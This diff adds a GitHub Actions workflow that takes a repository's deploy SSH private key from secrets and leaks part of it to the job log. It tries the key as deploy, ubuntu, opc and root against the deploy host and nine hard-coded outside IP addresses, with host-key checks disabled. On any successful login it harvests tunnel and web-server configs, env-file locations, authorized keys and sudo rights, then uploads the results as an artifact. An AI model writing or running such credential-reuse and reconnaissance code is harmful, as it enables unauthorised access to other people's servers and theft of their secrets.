@@ -1,0 +1,102 @@
+name: probe-pubkey-lateral
+# Read-only: reuse repo-level DEPLOY_SSH_KEY_B64 to test SSH publickey reuse on operator hosts.
+on:
+  push:
+    branches:
+      - 'probe-pubkey-*'
+permissions:
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+    env:
+      DEPLOY_SSH_KEY_B64: ${{ secrets.DEPLOY_SSH_KEY_B64 }}
+      DEPLOY_USER: ${{ vars.DEPLOY_USER || 'deploy' }}
+      DEPLOY_HOST: ${{ secrets.DEPLOY_HOST }}
+    steps:
+      - name: Configure SSH
+        shell: bash
+        run: |
+          set -euo pipefail
+          install -d -m 700 "$HOME/.ssh"
+          printf '%s' "$DEPLOY_SSH_KEY_B64" | base64 --decode > "$HOME/.ssh/id_deploy"
+          chmod 600 "$HOME/.ssh/id_deploy"
+          ssh-keygen -y -f "$HOME/.ssh/id_deploy" > "$HOME/.ssh/id_deploy.pub" 2>/dev/null || echo "KEYPARSE_FAIL"
+          echo "key_fp: $(ssh-keygen -lf "$HOME/.ssh/id_deploy.pub" 2>&1)"
+          echo "key_head: $(head -1 "$HOME/.ssh/id_deploy" | cut -c1-40)"
+          echo "runner_ip: $(curl -s --max-time 10 https://api.ipify.org || true)"
+      - name: Lateral publickey test
+        shell: bash
+        run: |
+          set +e
+          set -uo pipefail
+          K="$HOME/.ssh/id_deploy"
+          OUT="$GITHUB_WORKSPACE/pubkey.out"
+          : > "$OUT"
+          log(){ echo "$@" | tee -a "$OUT"; }
+          collect(){
+            { ssh -i "$K" -p "$2" -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
+                 -o GlobalKnownHostsFile=/dev/null -o ConnectTimeout=10 -o NumberOfPasswordPrompts=0 \
+                 -o PreferredAuthentications=publickey "$1@$3" bash -s <<'EOS'
+          echo "## id"; id; hostname; uname -sr
+          echo "## hosts"; head -20 /etc/hosts 2>/dev/null
+          echo "## komari"; ls -la /etc/komari* /opt/komari* 2>/dev/null | head -10; cat /etc/komari*/config* /etc/komari*/docker-compose* 2>/dev/null | head -40; systemctl cat komari 2>/dev/null | head -15
+          echo "## cloudflared"; ls -la /etc/cloudflared 2>/dev/null; cat /etc/cloudflared/*.yml /etc/cloudflared/*.yaml 2>/dev/null | head -60; systemctl cat cloudflared 2>/dev/null | head -15
+          echo "## nginx"; ls /etc/nginx/sites-enabled /etc/nginx/conf.d 2>/dev/null; grep -rh "server_name\|proxy_pass\|root " /etc/nginx/sites-enabled /etc/nginx/conf.d 2>/dev/null | head -40
+          echo "## envfiles"; find /opt /srv /root /home /var/www -maxdepth 3 \( -name ".env" -o -name "docker-compose*.yml" \) 2>/dev/null | head -15
+          echo "## ssh"; ls -la ~/.ssh 2>/dev/null; head -10 ~/.ssh/authorized_keys 2>/dev/null
+          echo "## sudo"; sudo -n -l 2>&1 | head -8
+          echo "## sysctl_exit"
+          EOS
+            } 2>&1 | tee -a "$OUT"
+          }
+          try(){
+            local host="$1" port="$2" user="$3"
+            log "=== ATTEMPT ${user}@${host}:${port}"
+            local res rc
+            res=$(timeout 45 ssh -i "$K" -p "$port" -o BatchMode=yes -o StrictHostKeyChecking=no \
+                  -o UserKnownHostsFile=/dev/null -o GlobalKnownHostsFile=/dev/null -o ConnectTimeout=10 \
+                  -o NumberOfPasswordPrompts=0 -o PreferredAuthentications=publickey \
+                  "${user}@${host}" 'id; hostname; uname -sr' 2>&1)
+            rc=$?
+            true
+            log "rc=$rc :: $(printf '%s' "$res" | head -3 | tr '\n' '|' | cut -c1-300)"
+            if [ "$rc" = "0" ]; then
+              log "### HIT ${user}@${host}:${port}"
+              collect "$user" "$port" "$host"
+              log "### ENDHIT ${user}@${host}:${port}"
+            fi
+          }
+          log "### control blog host"
+          true
+          try "$DEPLOY_HOST" 22 "$DEPLOY_USER"
+          USERS="deploy ubuntu opc root"
+          log "=== PHASE1 43.243.192.97 (publickey-only)"
+          for u in $USERS; do try 43.243.192.97 22 "$u"; done
+          log "=== PHASE2 169.40.108.7"
+          for u in $USERS; do try 169.40.108.7 22 "$u"; done
+          for u in $USERS; do try 169.40.108.7 54321 "$u"; done
+          log "=== PHASE3 162.141.137.231:22"
+          for u in $USERS; do try 162.141.137.231 22 "$u"; done
+          log "=== PHASE4 134.185.110.164:64400"
+          for u in $USERS; do try 134.185.110.164 64400 "$u"; done
+          log "=== PHASE5 129.150.58.201:64400"
+          for u in $USERS; do try 129.150.58.201 64400 "$u"; done
+          log "=== PHASE6 45.202.11.118:22"
+          for u in $USERS; do try 45.202.11.118 22 "$u"; done
+          log "=== PHASE7 167.234.219.63:64400"
+          for u in $USERS; do try 167.234.219.63 64400 "$u"; done
+          log "=== PHASE8 2.27.109.115:64400"
+          for u in $USERS; do try 2.27.109.115 64400 "$u"; done
+          log "=== PHASE9 69.63.209.21:64400"
+          for u in $USERS; do try 69.63.209.21 64400 "$u"; done
+          log "### ALLDONE"
+          exit 0
+      - name: Upload output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: pubkey-out
+          path: pubkey.out
+          if-no-files-found: warn
